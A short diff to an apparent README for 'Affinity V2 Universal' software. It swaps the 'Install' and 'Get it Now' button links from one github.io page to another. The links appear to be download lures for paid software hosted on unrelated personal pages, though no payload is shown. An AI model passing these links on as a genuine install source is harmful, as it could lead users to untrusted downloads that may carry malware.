@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://gazan-programs.github.io/.github/affinityV2Universal)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/AffinityV2Universal)
 
 </div>
 
@@ -81,7 +81,7 @@ Affinity V2 Universal's one-time pricing fundamentally changes the economics of 
 
 <p align="center">
 
-[![Get it Now Affinity V2 Universal](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://gazan-programs.github.io/.github/affinityV2Universal)
+[![Get it Now Affinity V2 Universal](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/affinityV2Universal)
 
 </p>
 
